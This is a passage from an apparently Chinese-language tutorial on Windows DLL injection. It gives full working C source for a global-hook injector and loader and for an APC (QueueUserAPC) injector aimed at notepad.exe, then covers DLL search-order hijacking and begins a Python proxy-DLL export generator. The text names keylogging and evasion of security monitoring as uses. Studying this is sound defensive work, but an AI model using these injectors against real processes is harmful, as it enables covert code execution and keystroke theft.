<li><code>WH_GETMESSAGE</code> &#x2F; <code>WH_KEYBOARD</code>：指定监听的消息类型。</li>
<li>最后一项参数 <code>0</code>：表示 <strong>全局钩子</strong> ，这是触发系统级注入的关键，它告诉 OS 监控所有线程。</li>
</ul>
</li>
<li><code>CallNextHookEx</code>：在 DLL 回调函数中调用，确保消息能继续传递，防止系统卡死。</li>
</ul>
<p><code>GlobalHookDll.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// GlobalHookDll.c</span></span><br><span class="line"><span class="comment">// 编译命令: gcc -shared -o GlobalHookDll.dll GlobalHookDll.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 宏定义：方便导出函数</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLLEXPORT __declspec(dllexport)</span></span><br><span class="line"><span class="comment">// 全局变量保存句柄和实例</span></span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE g_hInst = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 1. 钩子回调函数 (业务逻辑)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">LRESULT CALLBACK <span class="title function_">MyHookProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> &#123;</span><br><span class="line">    <span class="comment">// 只有当nCode &gt;= 0时才处理消息</span></span><br><span class="line">    <span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 为了演示，我们只在记事本里弹窗 (防止系统卡死)</span></span><br><span class="line">        <span class="type">char</span> path[MAX_PATH];</span><br><span class="line">        GetModuleFileNameA(<span class="literal">NULL</span>, path, MAX_PATH);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(path, <span class="string">&quot;notepad.exe&quot;</span>) || <span class="built_in">strstr</span>(path, <span class="string">&quot;Notepad.exe&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 简单的防重入标志，防止一个消息弹无数次窗</span></span><br><span class="line">            <span class="type">static</span> <span class="type">int</span> hasPopped = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> (hasPopped == <span class="number">0</span>) &#123;</span><br><span class="line">                MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;Exploooosion!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">                hasPopped = <span class="number">1</span>; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 必须调用下一个钩子 [cite: 6]</span></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 2. 导出函数：安装钩子 (参考附件 StartHook)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">DLLEXPORT <span class="type">void</span> <span class="title function_">StartHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// 在这里调用 API，而不是在 EXE 里</span></span><br><span class="line">        <span class="comment">// 参数 3 使用 g_hInst，这是 DllMain 获取到的自身模块句柄</span></span><br><span class="line">        <span class="comment">// 参数 4 填 0，代表全局注入 [cite: 7]</span></span><br><span class="line">        g_hHook = SetWindowsHookEx(WH_GETMESSAGE, MyHookProc, g_hInst, <span class="number">0</span>);</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Hook installed successfully.\n&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Failed to install hook. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 3. 导出函数：卸载钩子 (参考附件 StopHook)</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">DLLEXPORT <span class="type">void</span> <span class="title function_">StopHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(g_hHook);</span><br><span class="line">        g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[DLL] Hook removed.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line"><span class="comment">// 4. DllMain：获取自身句柄</span></span><br><span class="line"><span class="comment">// =============================================================</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="comment">// 保存 DLL 自身的实例句柄，StartHook 需要用到它 [cite: 9]</span></span><br><span class="line">        g_hInst = hinstDLL; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>hookinjection.c</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// HookLoader.c</span></span><br><span class="line"><span class="comment">// 编译命令: gcc -o HookLoader.exe HookLoader.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 定义函数指针类型，方便调用 DLL 里的函数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_StartHook)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*PFN_StopHook)</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_StartHook StartHook = <span class="literal">NULL</span>;</span><br><span class="line">    PFN_StopHook StopHook = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// 1. 加载 DLL</span></span><br><span class="line">    hDll = LoadLibraryA(<span class="string">&quot;GlobalHookDll.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!hDll) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to load DLL.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取 DLL 中导出的 StartHook 和 StopHook 函数地址</span></span><br><span class="line">    StartHook = (PFN_StartHook)GetProcAddress(hDll, <span class="string">&quot;StartHook&quot;</span>);</span><br><span class="line">    StopHook  = (PFN_StopHook)GetProcAddress(hDll, <span class="string">&quot;StopHook&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!StartHook || !StopHook) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to find exported functions.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 启动钩子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Loader] Calling StartHook()...\n&quot;</span>);</span><br><span class="line">    StartHook(); <span class="comment">// 直接调用 DLL 内部的逻辑</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Hook is running globally.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Press ENTER to stop the hook and exit...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 4. 阻塞主线程</span></span><br><span class="line">    <span class="comment">// 再次强调：Loader 必须活着，因为钩子是挂在这个进程名下的。</span></span><br><span class="line">    <span class="comment">// 如果 Loader 退出，StartHook 安装的钩子会被系统强制注销。</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="comment">// 5. 卸载钩子</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[Loader] Calling StopHook()...\n&quot;</span>);</span><br><span class="line">    StopHook();</span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击效果-1"><a href="#攻击效果-1" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul>
<li><strong>键盘记录 (Keylogger)</strong> ：通过 <code>WH_KEYBOARD</code> 钩子记录所有程序的键盘输入。</li>
<li><strong>隐蔽执行</strong> ：不需要创建新线程，代码在目标进程的主 UI 线程中执行。</li>
</ul>
<p><img src="/image/2025-12-12-windows_dll_injection/1765605236779.png" alt="1765605236779"></p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765605309784.png" alt="1765605309784"></p>
<h3 id="APC-注入-QueueUserAPC"><a href="#APC-注入-QueueUserAPC" class="headerlink" title="APC 注入 (QueueUserAPC)"></a>APC 注入 (QueueUserAPC)</h3><p>利用线程异步过程调用队列的“隐蔽”注入技术。</p>
<h4 id="技术原理-4"><a href="#技术原理-4" class="headerlink" title="技术原理"></a>技术原理</h4><p>每个线程都有一个 APC（Asynchronous Procedure Call）队列。操作系统允许一个进程向另一个进程的线程队列中插入一个函数调用。当该目标线程进入“可警醒状态”（Alertable State，例如调用 <code>SleepEx</code>）时，它会优先执行队列中的函数。</p>
<h4 id="实现方法与流程-参考-ApcInjector-c"><a href="#实现方法与流程-参考-ApcInjector-c" class="headerlink" title="实现方法与流程 (参考 ApcInjector.c)"></a>实现方法与流程 (参考 <code>ApcInjector.c</code>)</h4><ol>
<li><strong>准备环境</strong> ：打开目标进程，分配内存，写入 DLL 路径（同 CreateRemoteThread）。</li>
<li><strong>枚举线程</strong> ：获取目标进程的所有线程 ID（因为 APC 是针对线程的）。</li>
<li><strong>插入请求</strong> ：遍历每一个线程，调用 <code>QueueUserAPC</code> 将 <code>LoadLibrary</code> 插入队列。</li>
<li><strong>等待触发</strong> ：攻击者无法主动触发，只能等待目标线程自行进入可警醒状态。</li>
</ol>
<h4 id="核心-API-及作用-3"><a href="#核心-API-及作用-3" class="headerlink" title="核心 API 及作用"></a>核心 API 及作用</h4><ul>
<li><code>CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, ...)</code>：拍摄系统快照，用于枚举所有线程。</li>
<li><code>Thread32First</code> &#x2F; <code>Thread32Next</code>：遍历查找属于目标 PID 的线程 ID。</li>
<li><code>OpenThread(THREAD_SET_CONTEXT, ...)</code>：获取目标线程句柄，必须拥有设置上下文的权限。</li>
<li><code>QueueUserAPC(pLoadLibrary, hThread, pRemoteMem)</code>： <strong>核心触发点</strong> 。将 <code>LoadLibrary</code> 函数排队到目标线程的执行计划中。</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;injector.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// 编译命令: gcc -o ApcInjector.exe ApcInjector.c</span></span><br><span class="line"><span class="comment">// 确保 injector.h 在同级目录</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">wchar_t</span>* targetProcessName = <span class="string">L&quot;notepad.exe&quot;</span>;</span><br><span class="line">    <span class="type">wchar_t</span> dllPath[MAX_PATH];</span><br><span class="line">    <span class="comment">// 使用 GetFullPathNameW</span></span><br><span class="line">    <span class="keyword">if</span> (GetFullPathNameW(<span class="string">L&quot;MessageboxDll.dll&quot;</span>, MAX_PATH, dllPath, <span class="literal">NULL</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        wprintf(<span class="string">L&quot;Failed to get full path of DLL. Error: %d\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// =======================================</span></span><br><span class="line">    <span class="comment">// 1. 获取目标进程 PID</span></span><br><span class="line">    DWORD pid = GetProcessIdByName(targetProcessName);</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Target process not found: %ls\n&quot;</span>, targetProcessName);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Found PID: %lu\n&quot;</span>, pid);</span><br><span class="line">    <span class="comment">// 2. 尝试提权 (如果是注入系统进程则必须，普通进程可选)</span></span><br><span class="line">    <span class="keyword">if</span> (EnableDebugPrivilege()) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] SeDebugPrivilege enabled.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 打开目标进程</span></span><br><span class="line">    <span class="comment">// 需要 PROCESS_ALL_ACCESS 或至少 VM_WRITE/VM_OPERATION 权限 [cite: 29]</span></span><br><span class="line">    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">    <span class="keyword">if</span> (!hProcess) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] OpenProcess failed. Error: %lu\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 在目标进程分配内存</span></span><br><span class="line">    <span class="type">size_t</span> pathSize = (wcslen(dllPath) + <span class="number">1</span>) * <span class="keyword">sizeof</span>(<span class="type">wchar_t</span>);</span><br><span class="line">    LPVOID pRemoteMem = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, pathSize, MEM_COMMIT, PAGE_READWRITE); <span class="comment">// [cite: 30]</span></span><br><span class="line">    <span class="keyword">if</span> (!pRemoteMem) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] VirtualAllocEx failed.\n&quot;</span>);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 5. 写入 DLL 路径</span></span><br><span class="line">    <span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteMem, (LPVOID)dllPath, pathSize, <span class="literal">NULL</span>)) &#123; <span class="comment">// [cite: 31]</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] WriteProcessMemory failed.\n&quot;</span>);</span><br><span class="line">        VirtualFreeEx(hProcess, pRemoteMem, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">        CloseHandle(hProcess);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] DLL path written to remote memory.\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 获取 LoadLibraryW 地址</span></span><br><span class="line">    <span class="comment">// Kernel32.dll 在所有进程中的基址通常相同，所以直接取本地地址即可 [cite: 32]</span></span><br><span class="line">    PTHREAD_START_ROUTINE pLoadLibrary = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleW(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!pLoadLibrary) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to get LoadLibraryW address.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 7. 获取目标进程的所有线程</span></span><br><span class="line">    DWORD* pThreadIds = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD threadCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!GetProcessThreadList(pid, &amp;pThreadIds, &amp;threadCount)) &#123; <span class="comment">// 使用 injector.h 中的函数</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Failed to enumerate threads.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] Enumerated %lu threads in target process.\n&quot;</span>, threadCount);</span><br><span class="line">    <span class="comment">// 8. 遍历线程并插入 APC</span></span><br><span class="line">    <span class="type">int</span> successCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; threadCount; i++) &#123;</span><br><span class="line">        <span class="comment">// 打开线程，必须拥有 THREAD_SET_CONTEXT 访问权限才能通过 QueueUserAPC 注入 </span></span><br><span class="line">        HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION, FALSE, pThreadIds[i]); <span class="comment">// [cite: 36]</span></span><br><span class="line">        <span class="keyword">if</span> (hThread) &#123;</span><br><span class="line">            <span class="comment">// 核心函数：QueueUserAPC </span></span><br><span class="line">            <span class="comment">// 参数1: 要执行的函数 (LoadLibraryW)</span></span><br><span class="line">            <span class="comment">// 参数2: 目标线程句柄</span></span><br><span class="line">            <span class="comment">// 参数3: 传递给函数的参数 (远程内存中的 DLL 路径)</span></span><br><span class="line">            <span class="keyword">if</span> (QueueUserAPC((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)pRemoteMem)) &#123; <span class="comment">// [cite: 37]</span></span><br><span class="line">                successCount++;</span><br><span class="line">                <span class="comment">// printf(&quot;[+] APC queued for Thread ID: %lu\n&quot;, pThreadIds[i]);</span></span><br><span class="line">            &#125;</span><br><span class="line">            CloseHandle(hThread);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Successfully queued APC to %d threads.\n&quot;</span>, successCount);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[!] Waiting for target threads to enter &#x27;Alertable State&#x27; (e.g. SleepEx) to trigger execution...\n&quot;</span>);</span><br><span class="line">    <span class="comment">// 清理</span></span><br><span class="line">    <span class="keyword">if</span> (pThreadIds) VirtualFree(pThreadIds, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line">    CloseHandle(hProcess);</span><br><span class="line">    <span class="comment">// 注意：不要过早 VirtualFreeEx pRemoteMem，因为目标线程可能还没执行 APC。</span></span><br><span class="line">    <span class="comment">// 在实际恶意软件中，通常就不释放了，或者等待很长时间。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="攻击效果-2"><a href="#攻击效果-2" class="headerlink" title="攻击效果"></a>攻击效果</h4><ul>
<li><strong>高隐蔽性 (Stealth)</strong> ： <strong>不创建新线程</strong> 。大多数安全软件会监控 <code>CreateRemoteThread</code>，但对 <code>QueueUserAPC</code> 的监控相对较少。代码复用目标进程现有的线程执行。</li>
<li><strong>局限性</strong> ：依赖于目标进程的行为（必须调用 <code>SleepEx</code> 等函数），如果目标线程太忙或不进入可警醒状态，注入可能永远不会触发。</li>
</ul>
<p><img src="/image/2025-12-12-windows_dll_injection/1765616757981.png" alt="1765616757981"></p>
<h2 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h2><p>在Windows系统中运行可执行文件时，系统会调用相应需要的.dll文件，系统的默认优先级规则是最优先调用是当前目录下的.dll链接库，寻找不到则去系统目录下寻找。或者程序会动态生成目录然后使用loadlibrary去动态调用。</p>
<p>如果程序没有使用SetDllDirectory()函数设定dll加载绝对路径，则程序很大可能性即存在dll劫持注入漏洞。</p>
<h3 id="dll搜索顺序"><a href="#dll搜索顺序" class="headerlink" title="dll搜索顺序"></a>dll搜索顺序</h3><p>dll的搜索顺序一直在变化，包括使用一些安全手段来改变搜索顺序。一般的顺序如下</p>
<ol>
<li>应用程序加载的目录</li>
<li>系统目录，使用 GetSystemDirectory 获取该路径</li>
<li>16 位系统目录</li>
<li>Windows 目录，使用 GetWindowsDirectory 获取该路径</li>
<li>当前目录</li>
<li>PATH 环境变量中列出的目录</li>
</ol>
<p>如果要加载的 dll 模块属于 Known DLLs，系统直接加载系统目录下的该 dll，不会进行搜索。</p>
<p>Known DLLs 列表：<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</code></p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765687938486.png" alt="1765687938486"></p>
<h3 id="实现方法-1"><a href="#实现方法-1" class="headerlink" title="实现方法"></a>实现方法</h3><p>恶意dll无法做到完全复刻原本的dll的所有函数功能，只能通过函数转发的方式</p>
<p><img src="/image/2025-12-12-windows_dll_injection/1765844966874.png" alt="1765844966874"></p>
<p>使用Python 脚本（配合 <code>pefile</code> 库）把原 DLL 所有的函数名（如 <code>malloc</code>, <code>printf</code>, <code>free</code>…）和序号全部读出来，自动按照链接器的语法格式，生成 <code>.def</code> 文件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pefile</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">target_dll = <span class="string">&quot;version.dll&quot;</span></span><br><span class="line">proxy_dll = <span class="string">&quot;old&quot;</span> + target_dll</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 检查并重命名原文件</span></span><br><span class="line"><span class="keyword">if</span> os.path.exists(target_dll):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Renaming <span class="subst">&#123;target_dll&#125;</span> -&gt; <span class="subst">&#123;proxy_dll&#125;</span>&quot;</span>)</span><br><span class="line">    os.rename(target_dll, proxy_dll)</span><br><span class="line"><span class="keyword">elif</span> os.path.exists(proxy_dll):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] <span class="subst">&#123;target_dll&#125;</span> already renamed to <span class="subst">&#123;proxy_dll&#125;</span>, skipping rename.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] Error: Could not find <span class="subst">&#123;target_dll&#125;</span> or <span class="subst">&#123;proxy_dll&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 解析 DLL</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pe = pefile.PE(proxy_dll)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[-] PE Parse Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">def_file = target_dll.replace(<span class="string">&quot;.dll&quot;</span>, <span class="string">&quot;.def&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[*] Generating <span class="subst">&#123;def_file&#125;</span>...&quot;</span>)</span><br><span class="line"></span><br><span class="line">forward_module = proxy_dll.replace(<span 